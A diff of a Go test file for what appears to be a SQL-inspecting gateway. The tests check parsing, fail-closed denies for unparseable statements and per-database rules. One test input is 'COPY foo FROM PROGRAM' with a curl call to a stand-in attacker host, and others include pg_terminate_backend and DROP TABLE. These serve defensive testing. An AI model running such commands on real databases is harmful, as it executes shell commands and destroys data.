@@ -6,12 +6,14 @@ import (
 	"encoding/binary"
 	"io"
 	"net"
+	"strings"
 	"testing"
 	"time"
 
 	"github.com/google/go-cmp/cmp"
 
 	"github.com/denoland/clawpatrol/config"
+	"github.com/denoland/clawpatrol/config/facet"
 	"github.com/denoland/clawpatrol/config/match"
 	_ "github.com/denoland/clawpatrol/config/plugins/credentials"
 	_ "github.com/denoland/clawpatrol/config/plugins/facets/sql"
@@ -19,19 +21,22 @@ import (
 	"github.com/denoland/clawpatrol/config/runtime"
 )
 
-// TestParseSQL exercises the best-effort lexer that feeds the SQL
+// TestParseSQL exercises the AST extractor that feeds the SQL
 // matcher. Coverage focuses on the v14 use cases — banned verbs,
-// secret-table reads, banned function calls.
+// secret-table reads, banned function calls — plus the
+// fail-closed-on-parse-failure contract pgplex now opts into via
+// the Unparseable flag.
 func TestParseSQL(t *testing.T) {
 	cases := []struct {
-		name string
-		sql  string
-		want pgInfo
+		name            string
+		sql             string
+		want            pgInfo
+		wantUnparseable bool
 	}{
 		{
-			"simple select",
-			"SELECT id FROM users",
-			pgInfo{
+			name: "simple select",
+			sql:  "SELECT id FROM users",
+			want: pgInfo{
 				Verb:      "select",
 				Tables:    []string{"users"},
 				Functions: nil,
@@ -42,9 +47,9 @@ func TestParseSQL(t *testing.T) {
 			// AST extractor sorts tables alphabetically (map keys);
 			// rule writers don't depend on order — the matcher uses
 			// list-OR semantics over candidates.
-			"select with multiple tables (join)",
-			"SELECT u.id FROM users u JOIN tokens t ON t.user_id = u.id",
-			pgInfo{
+			name: "select with multiple tables (join)",
+			sql:  "SELECT u.id FROM users u JOIN tokens t ON t.user_id = u.id",
+			want: pgInfo{
 				Verb:      "select",
 				Tables:    []string{"tokens", "users"},
 				Functions: nil,
@@ -55,9 +60,9 @@ func TestParseSQL(t *testing.T) {
 			// AST extractor only surfaces real function callsites —
 			// VALUES, table-name + column-list parens etc. no longer
 			// pollute the functions list.
-			"insert with function",
-			"INSERT INTO audit (ts, what) VALUES (now(), 'x')",
-			pgInfo{
+			name: "insert with function",
+			sql:  "INSERT INTO audit (ts, what) VALUES (now(), 'x')",
+			want: pgInfo{
 				Verb:      "insert",
 				Tables:    []string{"audit"},
 				Functions: []string{"now"},
@@ -65,9 +70,9 @@ func TestParseSQL(t *testing.T) {
 			},
 		},
 		{
-			"banned function (pg_terminate_backend)",
-			"SELECT pg_terminate_backend(123)",
-			pgInfo{
+			name: "banned function (pg_terminate_backend)",
+			sql:  "SELECT pg_terminate_backend(123)",
+			want: pgInfo{
 				Verb:      "select",
 				Tables:    nil,
 				Functions: []string{"pg_terminate_backend"},
@@ -75,31 +80,57 @@ func TestParseSQL(t *testing.T) {
 			},
 		},
 		{
-			// §2.2: COPY ... FROM PROGRAM is non-cockroach syntax,
-			// so the AST parser rejects it and the sniff fallback
-			// kicks in. The fallback surfaces the table after COPY.
-			"COPY ... FROM PROGRAM",
-			"COPY foo FROM PROGRAM 'curl evil.example'",
-			pgInfo{
+			// COPY ... FROM PROGRAM is a postgres extension to the
+			// SQL standard COPY. pgplex's grammar accepts it; the
+			// matcher sees verb=copy, tables=[foo] and can deny on
+			// either facet. (Parser-failure coverage lives in the
+			// next case.)
+			name: "COPY ... FROM PROGRAM parses to verb=copy",
+			sql:  "COPY foo FROM PROGRAM 'curl evil.example'",
+			want: pgInfo{
 				Verb:      "copy",
 				Tables:    []string{"foo"},
-				Functions: nil,
 				Statement: "COPY foo FROM PROGRAM 'curl evil.example'",
 			},
 		},
 		{
-			"empty sql returns empty info",
-			"",
-			pgInfo{},
+			// Trailing-`;` DDL shell — pgplex rejects `DROP` (no
+			// target object). parseSQL takes the Unparseable path:
+			// Statement preserved (sans the splitter-stripped `;`),
+			// every other facet zero. The dispatcher's fail-closed
+			// gate (config/runtime/dispatch.go) then synth-denies any
+			// rule reading verb / tables / functions on this request.
+			// Mirrors cl-myyc's clickhouse_native Unparseable parity.
+			name: "trailing-semicolon DDL shell is unparseable",
+			sql:  "DROP;",
+			want: pgInfo{
+				Statement: "DROP",
+			},
+			wantUnparseable: true,
+		},
+		{
+			// Genuine garbage that pgplex can't tokenize → same
+			// Unparseable shape.
+			name: "syntax garbage is unparseable",
+			sql:  "###@@@???",
+			want: pgInfo{
+				Statement: "###@@@???",
+			},
+			wantUnparseable: true,
+		},
+		{
+			name: "empty sql returns empty info",
+			sql:  "",
+			want: pgInfo{},
 		},
 		{
 			// parseSQL is single-statement (per the ParseStatement
 			// plugin contract); multi-statement Q payloads are
 			// walked by the wire-protocol gateway via analyseAll.
 			// The first top-level statement is what comes back.
-			"multi-statement returns first statement",
-			"SELECT * FROM users; DELETE FROM sessions",
-			pgInfo{
+			name: "multi-statement returns first statement",
+			sql:  "SELECT * FROM users; DELETE FROM sessions",
+			want: pgInfo{
 				Verb:      "select",
 				Tables:    []string{"users"},
 				Functions: nil,
@@ -110,9 +141,9 @@ func TestParseSQL(t *testing.T) {
 			// §2.3: schema-qualified names emit both the qualified
 			// form and the unqualified leaf so rules written either
 			// way still catch the read. Order: alphabetical.
-			"schema-qualified table",
-			"SELECT * FROM audit.secret_tokens",
-			pgInfo{
+			name: "schema-qualified table",
+			sql:  "SELECT * FROM audit.secret_tokens",
+			want: pgInfo{
 				Verb:      "select",
 				Tables:    []string{"audit.secret_tokens", "secret_tokens"},
 				Functions: nil,
@@ -123,9 +154,9 @@ func TestParseSQL(t *testing.T) {
 			// §2.4: quoted identifiers are captured with case
 			// preserved, matching postgres' case-sensitive treatment
 			// of "Foo" vs Foo / foo.
-			"quoted identifier is captured case-sensitively",
-			"SELECT * FROM \"Sensitive Table\"",
-			pgInfo{
+			name: "quoted identifier is captured case-sensitively",
+			sql:  "SELECT * FROM \"Sensitive Table\"",
+			want: pgInfo{
 				Verb:      "select",
 				Tables:    []string{"Sensitive Table"},
 				Functions: nil,
@@ -135,9 +166,12 @@ func TestParseSQL(t *testing.T) {
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
-			got := parseSQL(tc.sql)
+			got, unparseable := parseSQL(tc.sql)
 			if diff := cmp.Diff(tc.want, got); diff != "" {
 				t.Errorf("parseSQL mismatch (-want +got):\n%s", diff)
+			}
+			if unparseable != tc.wantUnparseable {
+				t.Errorf("unparseable = %v, want %v", unparseable, tc.wantUnparseable)
 			}
 		})
 	}
@@ -207,7 +241,7 @@ func TestPgClientToServerForwardsQueryMessage(t *testing.T) {
 
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
-	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "")
+	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "", "")
 
 	wire := serializePgMessage(pgMessage{typ: 'Q', payload: []byte("SELECT 1\x00")})
 	go func() { _, _ = agent.Write(wire) }()
@@ -230,7 +264,7 @@ func TestPgClientToServerDeniesQueryMessage(t *testing.T) {
 			Outcome: config.Outcome{Verdict: "deny", Reason: "blocked"},
 		}}},
 	}
-	go pgClientToServer(ctx, ch, upstream, "")
+	go pgClientToServer(ctx, ch, upstream, "", "")
 
 	wire := serializePgMessage(pgMessage{typ: 'Q', payload: []byte("DROP TABLE users\x00")})
 	go func() { _, _ = agent.Write(wire) }()
@@ -249,7 +283,7 @@ func TestPgClientToServerForwardsNonInspectedMessage(t *testing.T) {
 
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
-	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "")
+	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "", "")
 
 	wire := serializePgMessage(pgMessage{typ: 'B', payload: []byte("portal\x00stmt\x00\x00\x00")})
 	go func() { _, _ = agent.Write(wire) }()
@@ -266,7 +300,7 @@ func TestPgClientToServerForwardsPartialFrame(t *testing.T) {
 
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
-	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "")
+	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "", "")
 
 	wire := serializePgMessage(pgMessage{typ: 'Q', payload: []byte("SELECT 1\x00")})
 	go func() {
@@ -287,7 +321,7 @@ func TestPgClientToServerForwardsMultipleFramesFromOneRead(t *testing.T) {
 
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
-	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "")
+	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "", "")
 
 	q := serializePgMessage(pgMessage{typ: 'Q', payload: []byte("SELECT 1\x00")})
 	syncMsg := serializePgMessage(pgMessage{typ: 'S'})
@@ -334,7 +368,7 @@ func TestPgClientToServerReturnsOnContextCancel(t *testing.T) {
 	done := make(chan struct{})
 	go func() {
 		defer close(done)
-		pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "")
+		pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "", "")
 	}()
 
 	cancel()
@@ -378,8 +412,7 @@ func pgEndpointFromHCL(t *testing.T, src string) *config.CompiledEndpoint {
 func TestPgClientToServerDeniesOversizeFrameWhenRuleReadsTruncatableFacet(t *testing.T) {
 	ep := pgEndpointFromHCL(t, `
 endpoint "postgres" "db" {
-  host     = "db.example.com:5432"
-  database = "app"
+  host = "db.example.com:5432"
 }
 profile "default" { endpoints = [db] }
 
@@ -401,7 +434,7 @@ rule "default-deny" {
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 	ch := &runtime.ConnHandle{Conn: gateway, Endpoint: ep}
-	go pgClientToServer(ctx, ch, upstream, "")
+	go pgClientToServer(ctx, ch, upstream, "", "")
 
 	// Declare a Q frame whose length exceeds maxPgMessage. We send
 	// the header followed by a small "body" that exercises the
@@ -444,7 +477,6 @@ func TestPgClientToServerForwardsOversizeFrameWhenNoRuleReadsTruncatableFacet(t 
 credential "bearer_token" "cred" {}
 endpoint "postgres" "db" {
   host       = "db.example.com:5432"
-  database   = "app"
   credential = cred
 }
 profile "default" { endpoints = [db] }
@@ -462,7 +494,7 @@ rule "by-credential" {
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 	ch := &runtime.ConnHandle{Conn: gateway, Endpoint: ep}
-	go pgClientToServer(ctx, ch, upstream, "cred")
+	go pgClientToServer(ctx, ch, upstream, "cred", "")
 
 	oversize := uint32(maxPgMessage + 8)
 	header := []byte{'Q', 0, 0, 0, 0}
@@ -501,9 +533,13 @@ func TestParseSQL_Audit143(t *testing.T) {
 		wantTables []string
 	}{
 		// §1.1 Trailing-semicolon / no-whitespace verbs no longer
-		// fold the punctuation into the verb token.
+		// fold the punctuation into the verb token. The DDL-shell
+		// case (`DROP;` with no target) routes through the
+		// Unparseable contract — pgplex refuses it, so a verb-keyed
+		// rule fail-closes via the dispatcher's Unparseable gate
+		// instead of trying to evaluate against `verb="drop"`.
+		// Dedicated coverage in TestParseSQL above.
 		{"§1.1 BEGIN;", "BEGIN;", "begin", nil},
-		{"§1.1 DROP;", "DROP;", "drop", nil},
 		{"§1.1 SELECT*FROM x", "SELECT*FROM x", "select", []string{"x"}},
 		{"§1.1 DELETE/*c*/FROM x", "DELETE/*c*/FROM x", "delete", []string{"x"}},
 		{"§1.1 SELECT;", "SELECT;", "select", nil},
@@ -574,7 +610,7 @@ func TestParseSQL_Audit143(t *testing.T) {
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
-			got := parseSQL(tc.sql)
+			got, _ := parseSQL(tc.sql)
 			if got.Verb != tc.wantVerb {
 				t.Errorf("Verb = %q, want %q", got.Verb, tc.wantVerb)
 			}
@@ -644,7 +680,7 @@ func TestPgEvaluate_Audit143(t *testing.T) {
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
 			ch := denyAll(denyRule("blocked"))
-			v, _ := pgEvaluate(ch, tc.sql, "")
+			v, _ := pgEvaluate(ch, tc.sql, "", "")
 			if v != "deny" {
 				t.Errorf("pgEvaluate(%q) verdict = %q, want deny", tc.sql, v)
 			}
@@ -659,6 +695,89 @@ type passThrough struct{}
 
 func (passThrough) Match(*match.Request) bool      { return true }
 func (passThrough) InspectsTruncatableFacet() bool { return false }
+func (passThrough) InspectsUnparseableFacet() bool { return false }
+
+// TestPgEvaluateUnparseableSynthDeny exercises the postgres side of
+// the Unparseable contract end-to-end: a request whose parser
+// refused the bytes runs the wire pump's pgEvaluate against an
+// endpoint with a verb-keyed rule. The matcher reads `sql.verb`,
+// which is zero on the unparseable request, so the dispatcher's
+// fail-closed-on-Unparseable gate (config/runtime/dispatch.go) must
+// synth a deny — same shape clickhouse_native gets from parseChSQL's
+// unparseable branch.
+//
+// Without postgres adopting the Unparseable flag, this test would
+// see the matcher silently allow (verb="" against `verb == 'drop'`
+// is false, no match → no rule fires → implicit allow). With the
+// contract, the unparseable flag triggers the synth-deny path.
+func TestPgEvaluateUnparseableSynthDeny(t *testing.T) {
+	ep := pgEndpointFromHCL(t, `
+endpoint "postgres" "db" {
+  host = "db.example.com:5432"
+}
+profile "default" { endpoints = [db] }
+
+rule "ban-drops" {
+  endpoint  = db
+  condition = "sql.verb == 'drop'"
+  verdict   = "deny"
+  reason    = "no drops"
+}
+`)
+	ch := &runtime.ConnHandle{
+		Endpoint: ep,
+		Emit:     func(runtime.ConnEvent) {},
+	}
+	// `DROP;` is the trailing-semicolon shell — pgplex refuses it,
+	// so analysePiece returns Unparseable=true and pgEvaluate stamps
+	// the flag onto the match.Request.
+	v, reason := pgEvaluate(ch, "DROP;", "", "")
+	if v != "deny" {
+		t.Fatalf("pgEvaluate(\"DROP;\") verdict = %q reason = %q, want deny", v, reason)
+	}
+	// The synth reason names the rule whose contract the unparseable
+	// request broke — dispatch.go:134's generic phrasing.
+	if !strings.Contains(reason, "ban-drops") || !strings.Contains(reason, "unparseable") {
+		t.Errorf("reason = %q, want it to name the rule and mention 'unparseable'", reason)
+	}
+}
+
+// TestPgEvaluateUnparseableLetsStatementOnlyRuleRun pins the other
+// half of the contract: a rule that reads only `sql.statement` runs
+// normally even when Unparseable=true, because the raw text IS
+// populated on parse failure. Mirrors
+// TestMatchRequestUnparseable_StatementRuleAllowsOnUnparseable in
+// config/runtime/dispatch_test.go, but on the postgres runtime end.
+func TestPgEvaluateUnparseableLetsStatementOnlyRuleRun(t *testing.T) {
+	ep := pgEndpointFromHCL(t, `
+endpoint "postgres" "db" {
+  host = "db.example.com:5432"
+}
+profile "default" { endpoints = [db] }
+
+rule "allow-known-shell" {
+  endpoint  = db
+  condition = "sql.statement.contains('DROP')"
+  priority  = 100
+  verdict   = "allow"
+}
+rule "ban-drops" {
+  endpoint  = db
+  condition = "sql.verb == 'drop'"
+  priority  = 50
+  verdict   = "deny"
+  reason    = "no drops"
+}
+`)
+	ch := &runtime.ConnHandle{
+		Endpoint: ep,
+		Emit:     func(runtime.ConnEvent) {},
+	}
+	v, reason := pgEvaluate(ch, "DROP;", "", "")
+	if v != "" {
+		t.Fatalf("pgEvaluate(\"DROP;\") verdict = %q reason = %q, want allow (no deny)", v, reason)
+	}
+}
 
 // TestPgClientToServerDeniesFunctionCall closes §4.1's FunctionCall
 // blind spot: the legacy 'F' fast-path carries no SQL text, so the
@@ -669,7 +788,7 @@ func TestPgClientToServerDeniesFunctionCall(t *testing.T) {
 
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
-	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "")
+	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "", "")
 
 	wire := serializePgMessage(pgMessage{typ: 'F', payload: []byte{0, 0, 0, 1, 0, 0}})
 	go func() { _, _ = agent.Write(wire) }()
@@ -698,7 +817,7 @@ func TestPgEvaluateEmitsAllowOnNoMatch(t *testing.T) {
 		},
 		Emit: func(ev runtime.ConnEvent) { events = append(events, ev) },
 	}
-	if v, _ := pgEvaluate(ch, "SELECT 1", ""); v != "" {
+	if v, _ := pgEvaluate(ch, "SELECT 1", "", ""); v != "" {
 		t.Errorf("verdict %q, want empty (allow)", v)
 	}
 	if len(events) != 1 {
@@ -709,5 +828,80 @@ func TestPgEvaluateEmitsAllowOnNoMatch(t *testing.T) {
 	}
 	if events[0].Verb != "select" {
 		t.Errorf("Verb = %q, want select", events[0].Verb)
+	}
+}
+
+// TestPgStartupParamExtractsDatabase confirms pgStartupParam pulls
+// the `database` parameter out of a postgres v3 StartupMessage,
+// which is how the wire frontend learns the session-scoped database
+// name to stamp on every subsequent match.Request.Meta.
+func TestPgStartupParamExtractsDatabase(t *testing.T) {
+	body := buildPgStartupBody(map[string]string{
+		"user":             "alice",
+		"database":         "Prod",
+		"application_name": "psql",
+	})
+	if got := pgStartupParam(body, "database"); got != "Prod" {
+		t.Errorf("pgStartupParam(database) = %q, want %q", got, "Prod")
+	}
+	if got := pgStartupParam(body, "user"); got != "alice" {
+		t.Errorf("pgStartupParam(user) = %q, want %q", got, "alice")
+	}
+	if got := pgStartupParam(body, "missing"); got != "" {
+		t.Errorf("pgStartupParam(missing) = %q, want empty", got)
+	}
+}
+
+// buildPgStartupBody assembles a synthetic v3 StartupMessage body in
+// the shape pgStartupParam parses: 4-byte length + 4-byte protocol
+// version + alternating null-terminated key/value strings + trailing
+// null. The 8-byte head matches what HandleConn pulls off the wire.
+func buildPgStartupBody(params map[string]string) []byte {
+	var payload []byte
+	for k, v := range params {
+		payload = append(payload, []byte(k)...)
+		payload = append(payload, 0)
+		payload = append(payload, []byte(v)...)
+		payload = append(payload, 0)
+	}
+	payload = append(payload, 0)
+	body := make([]byte, 8+len(payload))
+	binary.BigEndian.PutUint32(body[:4], uint32(len(body)))
+	binary.BigEndian.PutUint32(body[4:8], 196608)
+	copy(body[8:], payload)
+	return body
+}
+
+// TestPgEvaluateThreadsDatabaseIntoMeta verifies that the database
+// argument to pgEvaluate lands on the *sqlfacet.Meta the matcher
+// reads, by wiring a rule whose CEL condition fires only when
+// sql.database == "Prod". Case-sensitive: "prod" must NOT fire.
+func TestPgEvaluateThreadsDatabaseIntoMeta(t *testing.T) {
+	condition := `sql.database == "Prod" && sql.verb == "delete"`
+	m, err := facet.NewMatcher("sql", condition)
+	if err != nil {
+		t.Fatalf("matcher: %v", err)
+	}
+	ep := &config.CompiledEndpoint{
+		Name: "pg-test", Family: "sql",
+		Rules: []*config.CompiledRule{{
+			Name:    "prod-no-delete",
+			Matcher: m,
+			Outcome: config.Outcome{Verdict: "deny", Reason: "prod is read-only"},
+		}},
+	}
+	ch := &runtime.ConnHandle{Endpoint: ep, Emit: func(runtime.ConnEvent) {}}
+
+	if v, _ := pgEvaluate(ch, "DELETE FROM users", "", "Prod"); v != "deny" {
+		t.Errorf("DELETE on Prod verdict = %q, want deny", v)
+	}
+	if v, _ := pgEvaluate(ch, "DELETE FROM users", "", "prod"); v != "" {
+		t.Errorf("DELETE on prod (lowercase) verdict = %q, want allow", v)
+	}
+	if v, _ := pgEvaluate(ch, "DELETE FROM users", "", ""); v != "" {
+		t.Errorf("DELETE with empty database verdict = %q, want allow", v)
+	}
+	if v, _ := pgEvaluate(ch, "SELECT 1", "", "Prod"); v != "" {
+		t.Errorf("SELECT on Prod verdict = %q, want allow (verb mismatch)", v)
 	}
 }
